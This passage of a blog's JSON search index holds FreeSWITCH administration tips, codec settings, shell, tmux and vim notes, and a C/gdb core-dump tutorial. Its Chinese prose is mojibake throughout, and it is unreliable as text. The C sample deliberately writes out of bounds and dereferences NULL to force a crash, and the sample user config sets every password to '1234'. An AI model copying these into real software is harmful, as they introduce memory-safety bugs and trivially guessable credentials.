\u0026lt;on|off\u0026gt; sofia \u0026lt;status|xmlstatus\u0026gt; profile \u0026lt;name\u0026gt; [reg [\u0026lt;contact str\u0026gt;]] | [pres \u0026lt;pres str\u0026gt;] | [user \u0026lt;user@domain\u0026gt;] sofia \u0026lt;status|xmlstatus\u0026gt; gateway \u0026lt;name\u0026gt; sofia loglevel \u0026lt;all|default|tport|iptsec|nea|nta|nth_client|nth_server|nua|soa|sresolv|stun\u0026gt; [0-9] sofia tracelevel \u0026lt;console|alert|crit|err|warning|notice|info|debug\u0026gt; sofia help -------------------------------------------------------------------------------- å¼€å¯æ¶ˆæ¯å¤´å‹ç¼© \u0026lt;param name=\u0026#34;enable-compact-headers\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; fséœ€è¦é‡å¯\nå‘¼å«ç›¸å…³æŒ‡ä»¤ # æ˜¾ç¤ºå½“å‰å‘¼å« show calls # æ˜¾ç¤ºå‘¼å«æ•°é‡ show calls count # æŒ‚æ–­æŸä¸ªå‘¼å« uuid_kill 58579bd2-db78-4c7e-a666-0f16e19be643 # æŒ‚æ–­æ‰€æœ‰å‘¼å« hupall # sipæŠ“åŒ… sofia profile internal siptrace on sofia profile external siptrace on # æ‹¨æ‰“æŸä¸ªç”¨æˆ·å¹¶å¯ç”¨echoå›éŸ³ originate user/1000 \u0026amp;echo æ­£åˆ™æµ‹è¯• åœ¨fs_clié‡Œé¢å¯ä»¥ç”¨regexå¿«é€Ÿæµ‹è¯•æ­£åˆ™æ˜¯å¦ç¬¦åˆé¢„æœŸç»“æœ\nregex 123123 | \\d regex 123123 | ^\\d* å˜é‡æ±‚å€¼ eval $${mod_dir} eval $${recording_dir} ä¿®æ”¹UAä¿¡æ¯ sofia_external.conf.xml sofia_internal.conf.xml \u0026lt;param name=\u0026#34;user-agent-string\u0026#34; value=\u0026#34;wdd\u0026#34;/\u0026gt; \u0026lt;param name=\u0026#34;username\u0026#34; value=\u0026#34;wdd\u0026#34;/\u0026gt; ä¿®æ”¹ä¹‹åéœ€è¦rescan profile.\nmod_distributorçš„ä¸¤ä¸ªå¸¸ç”¨æŒ‡ä»¤ # reload distributor_ctl reload # æ±‚å€¼ eval ${distributor(distributor_list)} è‡ªåŠ¨æ¥å¬å›éŸ³æµ‹è¯• \u0026lt;extension name=\u0026#34;wdd_echo\u0026#34;\u0026gt; \u0026lt;condition field=\u0026#34;destination_number\u0026#34; expression=\u0026#34;^8002\u0026#34;\u0026gt; \u0026lt;action application=\u0026#34;info\u0026#34; data=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/action\u0026gt; \u0026lt;action application=\u0026#34;answer\u0026#34; data=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/action\u0026gt; \u0026lt;action application=\u0026#34;echo\u0026#34; data=\u0026#34;\u0026#34;\u0026gt;\u0026lt;/action\u0026gt; \u0026lt;/condition\u0026gt; \u0026lt;/extension\u0026gt; odbc-dsné…ç½®é”™è¯¯ï¼Œfsè¿›å…¥å‡æ­»çŠ¶æ€ æœ€è¿‘é‡åˆ°ä¸€ä¸ªå¥‡æ€ªçš„é—®é¢˜ï¼Œç›¸åŒçš„fsé•œåƒï¼Œåœ¨ä¸€ä¸ªç¯å¢ƒæ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯å†è¿›å…¥å¦ä¸€ä¸ªç¯å¢ƒçš„æ—¶å€™ï¼Œfsè¿›ç¨‹è¿è¡Œèµ·æ¥äº†ï¼Œä½†æ˜¯æ‰€æœ‰çš„åŠŸèƒ½éƒ½å¼‚å¸¸ï¼Œä»¿ä½›è¿›å…¥äº†å‡æ­»çŠ¶æ€ã€‚å¹¶ä¸”æ§åˆ¶å°çš„æ—¥å¿—è¾“å‡ºä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚\nåæ¥ï¼Œæˆ‘æƒ³èµ·æ¥ä»¥å‰æ›¾ç»é‡åˆ°è¿‡è¿™ä¸ªé—®é¢˜ã€‚\nè¿™ä¸ªfsçš„é•œåƒä¸­æ²¡æœ‰ç¼–è¯‘odbcç›¸å…³çš„ä¾èµ–ï¼Œä½†æ˜¯çœ‹sofia_external.conf.xmlå’Œsofia_internal.conf.xml, å´æœ‰odbcç›¸å…³çš„é…ç½®ã€‚\n\u0026lt;param name=\u0026#34;odbc-dsn\u0026#34; value=\u0026#34;....\u0026#34;\u0026gt; æ‰€ä»¥åªè¦æŠŠè¿™ä¸ªodbc-dsnçš„é…ç½®æ³¨é‡Šæ‰ï¼Œfså°±æ­£å¸¸è¿è¡Œäº†ã€‚\nå–æ¶ˆsession-timer æŸäº›æƒ…å†µä¸‹fsä¼šå¯¹å‘¼å…¥çš„ç”µè¯ï¼Œåœ¨é€šè¿‡æ—¶é•¿è¾¾åˆ°1åˆ†é’Ÿçš„æ—¶å€™ï¼Œå‘å¯¹ç«¯å‘é€ä¸€ä¸ªre-invite, å®é™…ä¸Šè¿™è¿˜æ˜¯ä¸€ä¸ªinviteè¯·æ±‚ï¼Œåªæ˜¯toå­—æ®µæœ‰äº†tagå‚æ•°ã€‚è¿™ä¸ªæœºåˆ¶å«åšsession-timer, å…·ä½“å®šä¹‰åœ¨RFC4028ä¸­ã€‚\nä½†æ˜¯æŸäº›SIPç»ˆç«¯å¯èƒ½ä¸æ”¯æŒre-invite, ç„¶åä¸å¯¹è¿™ä¸ªre-inviteåšå›åº”ï¼Œæˆ–è€…å›åº”äº†ä¸€ä¸ªé”™è¯¯çš„çŠ¶æ€ç ï¼Œéƒ½ä¼šå¯¼è‡´è¿™é€šå‘¼å«å¼‚å¸¸æŒ‚æ–­ã€‚\nåœ¨internal.xmlä¸­ä¿®æ”¹å¦‚ä¸‹è¡Œï¼š\n\u0026lt;param name=\u0026#34;enable-timer\u0026#34; value=\u0026#34;false\u0026#34;/\u0026gt; RTPå¤±æ´»è¶…æ—¶æ£€æµ‹ æŸä¸ªæ—¶åˆ»å¼€å§‹ï¼Œå®¢æˆ·ç«¯æ— æ³•å†å‘FSå‘é€æµåª’ä½“äº†ã€‚ä¾‹å¦‚å®¢æˆ·ç«¯Webé¡µé¢å…³é—­ï¼Œæˆ–è€…æµè§ˆå™¨å…³é—­ã€‚\nä½†æ˜¯åœ¨è¿™ç§åœºæ™¯ä¸‹ï¼ŒFSè¿˜æ˜¯ä¼šå‘å®¢æˆ·ç«¯å‘é€ä¸€æ®µæ—¶é—´çš„åª’ä½“æµï¼Œç„¶åå†å‘é€BYEæ¶ˆæ¯ã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬å¦‚ä½•æ§åˆ¶è¿™ä¸ªRTPå¤±æ´»çš„æ£€æµ‹æ—¶é—´å‘¢ï¼Ÿ\nåœ¨internal.xmlæˆ–è€…external.xmlä¸­ï¼Œæœ‰ä»¥ä¸‹å‚æ•°ï¼Œå¯ä»¥æ§åˆ¶æ£€æµ‹RTPè¶…æ—¶æ—¶é—´ã€‚\nrtp-timeout-sec rtpè¶…æ—¶ç§’æ•° rtp-hold-timeout-sec rtpholdè¶…æ—¶ç§’æ•° \u0026lt;param name=\u0026#34;rtp-timeout-sec\u0026#34; value=\u0026#34;10\u0026#34;/\u0026gt; \u0026lt;param name=\u0026#34;rtp-hold-timeout-sec\u0026#34; value=\u0026#34;10\u0026#34;/\u0026gt; sofia profile internal restart\nfs é…ç½®å¤šç§Ÿæˆ·åˆ†æœº åˆ†æœºçš„ç›¸å…³é…ç½®éƒ½æ˜¯ä½äºconf/directoryç›®å½•ä¸­, æˆ‘çš„directoryç›®å½•ä¸­åªæœ‰ä¸€ä¸ªdefault.xmlæ–‡ä»¶\n\u0026lt;include\u0026gt; \u0026lt;domain name=\u0026#34;123.cc\u0026#34;\u0026gt; \u0026lt;user id=\u0026#34;1000\u0026#34;\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param name=\u0026#34;password\u0026#34; value=\u0026#34;1234\u0026#34;/\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;user id=\u0026#34;1001\u0026#34;\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param name=\u0026#34;password\u0026#34; value=\u0026#34;1234\u0026#34;/\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/domain\u0026gt; \u0026lt;domain name=\u0026#34;abc.cc\u0026#34;\u0026gt; \u0026lt;user id=\u0026#34;1000\u0026#34;\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param name=\u0026#34;password\u0026#34; value=\u0026#34;1234\u0026#34;/\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;user id=\u0026#34;1001\u0026#34;\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param name=\u0026#34;password\u0026#34; value=\u0026#34;1234\u0026#34;/\u0026gt; \u0026lt;/params\u0026gt; \u0026lt;/user\u0026gt; \u0026lt;/domain\u0026gt; \u0026lt;/include\u0026gt; fsçŠ¶æ€è½¬ç§»å›¾ ","permalink":"https://wdd.js.org/freeswitch/tips/","summary":"å®‰è£…å•ä¸ªæ¨¡å— make mod_sofia-install make mod_ilbc-install fs-cliäº‹ä»¶è®¢é˜… /event plain ALL /event plain CHANNEL_ANSWER sofia å¸®åŠ©æ–‡æ¡£ sofia help USAGE: -------------------------------------------------------------------------------- sofia global siptrace \u0026lt;on|off\u0026gt; sofia capture \u0026lt;on|off\u0026gt; watchdog \u0026lt;on|off\u0026gt; sofia profile \u0026lt;name\u0026gt; [start | stop | restart | rescan] [wait] flush_inbound_reg [\u0026lt;call_id\u0026gt; | \u0026lt;[user]@domain\u0026gt;] [reboot] check_sync [\u0026lt;call_id\u0026gt; | \u0026lt;[user]@domain\u0026gt;] [register | unregister] [\u0026lt;gateway name\u0026gt; | all] killgw \u0026lt;gateway name\u0026gt; [stun-auto-disable | stun-enabled] [true | false]] siptrace \u0026lt;on|off\u0026gt; capture \u0026lt;on|off\u0026gt; watchdog \u0026lt;on|off\u0026gt; sofia \u0026lt;status|xmlstatus\u0026gt; profile \u0026lt;name\u0026gt; [reg [\u0026lt;contact str\u0026gt;]] | [pres \u0026lt;pres str\u0026gt;] | [user \u0026lt;user@domain\u0026gt;] sofia \u0026lt;status|xmlstatus\u0026gt; gateway \u0026lt;name\u0026gt; sofia loglevel \u0026lt;all|default|tport|iptsec|nea|nta|nth_client|nth_server|nua|soa|sresolv|stun\u0026gt; [0-9] sofia tracelevel \u0026lt;console|alert|crit|err|warning|notice|info|debug\u0026gt; sofia help -------------------------------------------------------------------------------- å¼€å¯æ¶ˆæ¯å¤´å‹ç¼© \u0026lt;param name=\u0026#34;enable-compact-headers\u0026#34; value=\u0026#34;true\u0026#34;/\u0026gt; fséœ€è¦é‡å¯","title":"FSå¸¸ç”¨è¿ç»´æ‰‹å†Œ"},{"content":"æŸ¥çœ‹FSæ”¯æŒçš„ç¼–ç  show codec ç¼–ç è®¾ç½® vars.xml\nglobal_codec_prefs=G722,PCMU,PCMA,GSM outbound_codec_prefs=PCMU,PCMA,GSM æŸ¥çœ‹FSä½¿ç”¨çš„ç¼–ç  \u0026gt; sofia status profile internal CODECS IN ILBC,PCMU,PCMA,GSM CODECS OUT ILBC,PCMU,PCMA,GSM \u0026gt; sofia status profile external CODECS IN ILBC,PCMU,PCMA,GSM CODECS OUT ILBC,PCMU,PCMA,GSM ä½¿ä¿®æ”¹åçš„profileç”Ÿæ•ˆ \u0026gt; sofia profile internal rescan \u0026gt; sofia profile external rescan é‡å¯profile \u0026gt; sofia profile internal restart \u0026gt; sofia profile external restart ","permalink":"https://wdd.js.org/freeswitch/media-settings/","summary":"æŸ¥çœ‹FSæ”¯æŒçš„ç¼–ç  show codec ç¼–ç è®¾ç½® vars.xml\nglobal_codec_prefs=G722,PCMU,PCMA,GSM outbound_codec_prefs=PCMU,PCMA,GSM æŸ¥çœ‹FSä½¿ç”¨çš„ç¼–ç  \u0026gt; sofia status profile internal CODECS IN ILBC,PCMU,PCMA,GSM CODECS OUT ILBC,PCMU,PCMA,GSM \u0026gt; sofia status profile external CODECS IN ILBC,PCMU,PCMA,GSM CODECS OUT ILBC,PCMU,PCMA,GSM ä½¿ä¿®æ”¹åçš„profileç”Ÿæ•ˆ \u0026gt; sofia profile internal rescan \u0026gt; sofia profile external rescan é‡å¯profile \u0026gt; sofia profile internal restart \u0026gt; sofia profile external restart ","title":"FreeSWITCH åª’ä½“ç›¸å…³æ“ä½œ"},{"content":"å¤åˆ¶æ–‡æœ¬åˆ°å‰ªè´´æ¿ sudo apt install xclip vim ~/.zshrc\nalias copy=\u0026#39;xclip -selection clipboard\u0026#39; è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨copyå‘½ä»¤æ¥è€ƒæœ¬æ–‡ä»¶å†…å®¹åˆ°ç³»ç»Ÿå‰ªè´´æ¿äº†ã€‚\ncopy aaa.txt åˆ¤æ–­å·¥ä½œåŒºæ˜¯å¦clean if [ -z \u0026#34;$(git status --porcelain)\u0026#34; ]; then # Working directory clean else # Uncommitted changes fi ","permalink":"https://wdd.js.org/posts/2022/05/shell-101/","summary":"å¤åˆ¶æ–‡æœ¬åˆ°å‰ªè´´æ¿ sudo apt install xclip vim ~/.zshrc\nalias copy=\u0026#39;xclip -selection clipboard\u0026#39; è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç”¨copyå‘½ä»¤æ¥è€ƒæœ¬æ–‡ä»¶å†…å®¹åˆ°ç³»ç»Ÿå‰ªè´´æ¿äº†ã€‚\ncopy aaa.txt åˆ¤æ–­å·¥ä½œåŒºæ˜¯å¦clean if [ -z \u0026#34;$(git status --porcelain)\u0026#34; ]; then # Working directory clean else # Uncommitted changes fi ","title":"Shell æ•™ç¨‹æŠ€å·§"},{"content":"å¼€å¯coredump #å¦‚æœè¯¥å‘½ä»¤çš„è¿”å›å€¼æ˜¯0ï¼Œåˆ™è¡¨ç¤ºä¸å¼€å¯coredump ulimit -c # å¼€å¯coredump ulimit -c unlimited å‡†å¤‡cæ–‡ä»¶ #include\u0026lt;stdio.h\u0026gt; void crash() { char * p = NULL; *p = 0; } int main(){ printf(\u0026#34;hello world 1\u0026#34;); int phone [4]; phone[232] = 12; crash(); return 0; } ç¼–è¯‘æ‰§è¡Œ gcc -g hello.c -o hello ./hello ä¹‹åç¨‹åºå´©æºƒï¼Œäº§ç”Ÿcoreæ–‡ä»¶ã€‚\ngdbåˆ†æ gdb å¯åŠ¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ coreæ–‡ä»¶\ngdb ./hello ./core ä¹‹åè¾“å…¥ï¼š bt full å¯ä»¥æŸ¥çœ‹åˆ°æ›´è¯¦ç»†çš„ä¿¡æ¯\nâœ c-sandbox gdb ./hello ./core GNU gdb (Raspbian 7.12-6) 7.12.0.20161007-git Copyright (C) 2016 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type \u0026#34;show copying\u0026#34; and \u0026#34;show warranty\u0026#34; for details. This GDB was configured as \u0026#34;arm-linux-gnueabihf\u0026#34;. Type \u0026#34;show configuration\u0026#34; for configuration details. For bug reporting instructions, please see: \u0026lt;http://www.gnu.org/software/gdb/bugs/\u0026gt;. Find the GDB manual and other documentation resources online at: \u0026lt;http://www.gnu.org/software/gdb/documentation/\u0026gt;. For help, type \u0026#34;help\u0026#34;. Type \u0026#34;apropos word\u0026#34; to search for commands related to \u0026#34;word\u0026#34;... Reading symbols from ./hello...done. [New LWP 25571] Core was generated by `./hello\u0026#39;. Program terminated with signal SIGSEGV, Segmentation fault. #0 0x0001045c in crash () at hello.c:6 6 *p = 0; (gdb) bt full #0 0x0001045c in crash () at hello.c:6 p = 0x0 #1 0x00010490 in main () at hello.c:13 phone = {66328, 0, 0, 0} ","permalink":"https://wdd.js.org/posts/2022/05/c-and-gdb/","summary":"å¼€å¯coredump #å¦‚æœè¯¥å‘½ä»¤çš„è¿”å›å€¼æ˜¯0ï¼Œåˆ™è¡¨ç¤ºä¸å¼€å¯coredump ulimit -c # å¼€å¯coredump ulimit -c unlimited å‡†å¤‡cæ–‡ä»¶ #include\u0026lt;stdio.h\u0026gt; void crash() { char * p = NULL; *p = 0; } int main(){ printf(\u0026#34;hello world 1\u0026#34;); int phone [4]; phone[232] = 12; crash(); return 0; } ç¼–è¯‘æ‰§è¡Œ gcc -g hello.c -o hello ./hello ä¹‹åç¨‹åºå´©æºƒï¼Œäº§ç”Ÿcoreæ–‡ä»¶ã€‚\ngdbåˆ†æ gdb å¯åŠ¨çš„äºŒè¿›åˆ¶æ–‡ä»¶ coreæ–‡ä»¶\ngdb ./hello ./core ä¹‹åè¾“å…¥ï¼š bt full å¯ä»¥æŸ¥çœ‹åˆ°æ›´è¯¦ç»†çš„ä¿¡æ¯\nâœ c-sandbox gdb ./hello ./core GNU gdb (Raspbian 7.12-6) 7.12.0.20161007-git Copyright (C) 2016 Free Software Foundation, Inc.","title":"Cå’Œgdbè°ƒè¯•"},{"content":"oh my tmux å…³é—­ç¬¬äºŒé”®ctrl-a ctrl-aå¯ä»¥ç”¨æ¥ç§»åŠ¨å…‰æ ‡åˆ°è¡Œé¦–çš„ï¼Œä¸è¦ä½œä¸ºtmuxçš„ç¬¬äºŒé”®\nset -gu prefix2 unbind C-a Tmux reload config :source-file ï½/.tmux.conf tmux æ˜¾ç¤ºæ—¶é—´ ctrl b + t tmuxä»å½“å‰ç›®å½•æ‰“å¼€æ–°çš„çª—å£ bind \u0026#39;\u0026#34;\u0026#39; split-window -c \u0026#34;#{pane_current_path}\u0026#34; bind % split-window -h -c \u0026#34;#{pane_current_path}\u0026#34; bind c new-window -c \u0026#34;#{pane_current_path}\u0026#34; ","permalink":"https://wdd.js.org/posts/2022/05/tmux-faq/","summary":"oh my tmux å…³é—­ç¬¬äºŒé”®ctrl-a ctrl-aå¯ä»¥ç”¨æ¥ç§»åŠ¨å…‰æ ‡åˆ°è¡Œé¦–çš„ï¼Œä¸è¦ä½œä¸ºtmuxçš„ç¬¬äºŒé”®\nset -gu prefix2 unbind C-a Tmux reload config :source-file ï½/.tmux.conf tmux æ˜¾ç¤ºæ—¶é—´ ctrl b + t tmuxä»å½“å‰ç›®å½•æ‰“å¼€æ–°çš„çª—å£ bind \u0026#39;\u0026#34;\u0026#39; split-window -c \u0026#34;#{pane_current_path}\u0026#34; bind % split-window -h -c \u0026#34;#{pane_current_path}\u0026#34; bind c new-window -c \u0026#34;#{pane_current_path}\u0026#34; ","title":"Tmux å¸¸è§é—®é¢˜ä»¥åŠè§£å†³æ–¹æ¡ˆ"},{"content":"ä¿®æ”¹coc-vimçš„é”™è¯¯æç¤º coc-vimçš„é”™è¯¯æç¤ºçª—å£èƒŒæ™¯è‰²æ˜¯ç²‰çº¢ï¼Œå‰æ™¯è‰²æ˜¯æ·±çº¢ã€‚è¿™æ ·çš„æ©é¥°æ­é…ï¼Œå¾ˆéš¾çœ‹åˆ°å…·ä½“çš„æ–‡å­—é¢œè‰²ã€‚\næ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠå‰æ™¯è‰²æ”¹æˆç™½è‰²ã€‚\n:highlight CocErrorFloat ctermfg=White å‚è€ƒ https://stackoverflow.com/questions/64180454/how-to-change-coc-nvim-floating-window-colors\nvim goä¸€ç›´å¡åœ¨åˆå§‹åŒ– æœ‰å¯èƒ½æ²¡æœ‰å®‰è£…äºŒè¿›åˆ¶å·¥å…·\n:GoInstallBinaries neovim å…‰æ ‡å˜æˆç»†çº¿è§£å†³æ–¹æ¡ˆ :set guicursor= ","permalink":"https://wdd.js.org/vim/vim-faq/","summary":"ä¿®æ”¹coc-vimçš„é”™è¯¯æç¤º coc-vimçš„é”™è¯¯æç¤ºçª—å£èƒŒæ™¯è‰²æ˜¯ç²‰çº¢ï¼Œå‰æ™¯è‰²æ˜¯æ·±çº¢ã€‚è¿™æ ·çš„æ©é¥°æ­é…ï¼Œå¾ˆéš¾çœ‹åˆ°å…·ä½“çš„æ–‡å­—é¢œè‰²ã€‚\næ‰€ä»¥æˆ‘ä»¬éœ€è¦æŠŠå‰æ™¯è‰²æ”¹æˆç™½è‰²ã€‚\n:highlight CocErrorFloat ctermfg=White å‚è€ƒ https://stackoverflow.com/questions/64180454/how-to-change-coc-nvim-floating-window-colors\nvim goä¸€ç›´å¡åœ¨åˆå§‹åŒ– æœ‰å¯èƒ½æ²¡æœ‰å®‰è£…äºŒè¿›åˆ¶å·¥å…·\n:GoInstallBinaries neovim å…‰æ ‡å˜æˆç»†çº¿è§£å†³æ–¹æ¡ˆ :set guicursor= ","title":"Vim å¸¸è§é—®é¢˜ä»¥åŠè§£å†³æ–¹æ¡ˆ"},{"content":"æˆ‘æ‰¿è®¤ï¼Œvscodeå¾ˆé¦™ï¼Œä½†æ˜¯vimçš„å¼€å‘æ–¹å¼ä¹Ÿè®©æˆ‘æ— æ³•å‰²èˆã€‚\nvscodeä¸­æœ‰ä¸ªvimæ’ä»¶ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥æ»¡è¶³å¤§éƒ¨åˆ†vimçš„åŠŸèƒ½ã€‚\nè¿™é‡Œæˆ‘å®šä¹‰äº†æˆ‘åœ¨vimå¸¸ç”¨çš„leaderå¿«æ·é”®ã€‚\nè®¾ç½®,ä¸ºé»˜è®¤çš„leader \u0026#34;vim.leader\u0026#34;: \u0026#34;,\u0026#34;, åœ¨Normalæ¨¡å¼èƒ½comand+cå¤åˆ¶ \u0026#34;vim.handleKeys\u0026#34;: { \u0026#34;\u0026lt;C-c\u0026gt;\u0026#34;: false, \u0026#34;\u0026lt;C-v\u0026gt;\u0026#34;: false }, leaderå¿«æ·é”® åœ¨æ’å…¥æ¨¡å¼å®‰jjä¼šè·³å‡ºæ’å…¥æ¨¡å¼ ,a: è·³åˆ°è¡Œå°¾éƒ¨ï¼Œå¹¶è¿›å…¥æ’å…¥æ¨¡å¼ ,c: å…³é—­å½“å‰æ ‡ç­¾é¡µ ,C: å…³é—­å…¶ä»–æ ‡ç­¾é¡µ ,j: è·³è½¬åˆ°å·¦è¾¹æ ‡ç­¾é¡µ ,k: è·³è½¬åˆ°å³è¾¹æ ‡ç­¾é¡µ ,w: ä¿å­˜æ–‡ä»¶ ,t: ç»™å‡ºæç¤ºæ¡† ,b: æ˜¾ç¤ºæˆ–è€…éšè—æ–‡ä»¶æ ‘çª—å£ å®Œæ•´çš„é…ç½® \u0026#34;vim.leader\u0026#34;: \u0026#34;,\u0026#34;, \u0026#34;vim.insertModeKeyBindings\u0026#34;: [ { \u0026#34;before\u0026#34;: [ \u0026#34;j\u0026#34;, \u0026#34;j\u0026#34; ], \u0026#34;after\u0026#34;: [ \u0026#34;\u0026lt;Esc\u0026gt;\u0026#34; ] } ], \u0026#34;vim.handleKeys\u0026#34;: { \u0026#34;\u0026lt;C-c\u0026gt;\u0026#34;: false, \u0026#34;\u0026lt;C-v\u0026gt;\u0026#34;: false }, \u0026#34;vim.normalModeKeyBindingsNonRecursive\u0026#34;: [ { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;a\u0026#34; ], \u0026#34;after\u0026#34;: [ \u0026#34;A\u0026#34; ] }, { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;c\u0026#34; ], \u0026#34;commands\u0026#34;: [ \u0026#34;workbench.action.closeActiveEditor\u0026#34; ] }, { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;C\u0026#34; ], \u0026#34;commands\u0026#34;: [ \u0026#34;workbench.action.closeOtherEditors\u0026#34; ] }, { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;j\u0026#34; ], \u0026#34;commands\u0026#34;: [ \u0026#34;workbench.action.previousEditor\u0026#34; ] }, { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;k\u0026#34; ], \u0026#34;commands\u0026#34;: [ \u0026#34;workbench.action.nextEditor\u0026#34; ] }, { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;w\u0026#34; ], \u0026#34;commands\u0026#34;: [ \u0026#34;workbench.action.files.save\u0026#34; ] }, { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;t\u0026#34; ], \u0026#34;commands\u0026#34;: [ \u0026#34;editor.action.showHover\u0026#34; ] }, { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;b\u0026#34; ], \u0026#34;commands\u0026#34;: [ \u0026#34;workbench.action.toggleSidebarVisibility\u0026#34; ] }, ] ","permalink":"https://wdd.js.org/vim/vscode-vim/","summary":"æˆ‘æ‰¿è®¤ï¼Œvscodeå¾ˆé¦™ï¼Œä½†æ˜¯vimçš„å¼€å‘æ–¹å¼ä¹Ÿè®©æˆ‘æ— æ³•å‰²èˆã€‚\nvscodeä¸­æœ‰ä¸ªvimæ’ä»¶ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥æ»¡è¶³å¤§éƒ¨åˆ†vimçš„åŠŸèƒ½ã€‚\nè¿™é‡Œæˆ‘å®šä¹‰äº†æˆ‘åœ¨vimå¸¸ç”¨çš„leaderå¿«æ·é”®ã€‚\nè®¾ç½®,ä¸ºé»˜è®¤çš„leader \u0026#34;vim.leader\u0026#34;: \u0026#34;,\u0026#34;, åœ¨Normalæ¨¡å¼èƒ½comand+cå¤åˆ¶ \u0026#34;vim.handleKeys\u0026#34;: { \u0026#34;\u0026lt;C-c\u0026gt;\u0026#34;: false, \u0026#34;\u0026lt;C-v\u0026gt;\u0026#34;: false }, leaderå¿«æ·é”® åœ¨æ’å…¥æ¨¡å¼å®‰jjä¼šè·³å‡ºæ’å…¥æ¨¡å¼ ,a: è·³åˆ°è¡Œå°¾éƒ¨ï¼Œå¹¶è¿›å…¥æ’å…¥æ¨¡å¼ ,c: å…³é—­å½“å‰æ ‡ç­¾é¡µ ,C: å…³é—­å…¶ä»–æ ‡ç­¾é¡µ ,j: è·³è½¬åˆ°å·¦è¾¹æ ‡ç­¾é¡µ ,k: è·³è½¬åˆ°å³è¾¹æ ‡ç­¾é¡µ ,w: ä¿å­˜æ–‡ä»¶ ,t: ç»™å‡ºæç¤ºæ¡† ,b: æ˜¾ç¤ºæˆ–è€…éšè—æ–‡ä»¶æ ‘çª—å£ å®Œæ•´çš„é…ç½® \u0026#34;vim.leader\u0026#34;: \u0026#34;,\u0026#34;, \u0026#34;vim.insertModeKeyBindings\u0026#34;: [ { \u0026#34;before\u0026#34;: [ \u0026#34;j\u0026#34;, \u0026#34;j\u0026#34; ], \u0026#34;after\u0026#34;: [ \u0026#34;\u0026lt;Esc\u0026gt;\u0026#34; ] } ], \u0026#34;vim.handleKeys\u0026#34;: { \u0026#34;\u0026lt;C-c\u0026gt;\u0026#34;: false, \u0026#34;\u0026lt;C-v\u0026gt;\u0026#34;: false }, \u0026#34;vim.normalModeKeyBindingsNonRecursive\u0026#34;: [ { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;a\u0026#34; ], \u0026#34;after\u0026#34;: [ \u0026#34;A\u0026#34; ] }, { \u0026#34;before\u0026#34;: [ \u0026#34;\u0026lt;leader\u0026gt;\u0026#34;, \u0026#34;c\u0026#34; ], \u0026#34;commands\u0026#34;: [ \u0026#34;workbench.","title":"vscode vimæ’ä»¶è‡ªå®šä¹‰å¿«æ·é”®"},{"content":"neovimå¦‚ä½•ä¸ç³»ç»Ÿå‰ªè´´æ¿äº¤äº’ï¼Ÿ neovimå’Œç³»ç»Ÿå‰ªè´´æ¿çš„äº¤äº’æ–¹å¼å’Œvimçš„æœºåˆ¶æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥ä¸è¦å…ˆå…¥ä¸ºä¸»çš„ç”¨vimçš„æ–¹å¼ä½¿ç”¨neovimã€‚\nneoviméœ€è¦å¤–éƒ¨çš„ç¨‹åºä¸ç³»ç»Ÿå‰ªè´´æ¿è¿›è¡Œäº¤äº’ï¼Œå‚è€ƒ:help clipboard\nneovimæŒ‰ç…§å¦‚ä¸‹çš„ä¼˜å…ˆçº§çº§æ–¹å¼é€‰æ‹©äº¤äº’ç¨‹åºï¼š\n- |g:clipboard| - pbcopy, pbpaste (macOS) - wl-copy, wl-paste (if $WAYLAND_DISPLAY is set) - xclip (if $DISPLAY is set) - xsel (if $DISPLAY is set) - lemonade (for SSH) https://github.com/pocke/lemonade - doitclient (for SSH) http://www.chiark.greenend.org.uk/~sgtatham/doit/ - win32yank (Windows) - termux (via termux-clipboard-set, termux-clipboard-set) - tmux (if $TMUX is set) å› ä¸ºæˆ‘çš„æ“ä½œç³»ç»Ÿæ˜¯linux, æ‰€ä»¥æ–¹ä¾¿çš„æ–¹å¼æ˜¯ç›´æ¥å®‰è£…xclipã€‚\nsudo pacman -Syu xclip ä¸¤ä¸ªç³»ç»Ÿå‰ªè´´æ¿æœ‰ä½•ä¸åŒï¼Ÿ å¯¹äºwindowså’Œmacæ¥è¯´ï¼Œåªæœ‰æœ‰ä¸€ä¸ªç³»ç»Ÿå‰ªè´´æ¿ï¼Œå¯¹äºlinuxæœ‰ä¸¤ä¸ªã€‚\nå‰ªè´´æ¿ï¼Œé¼ æ ‡é€‰æ‹©å‰ªè´´æ¿ 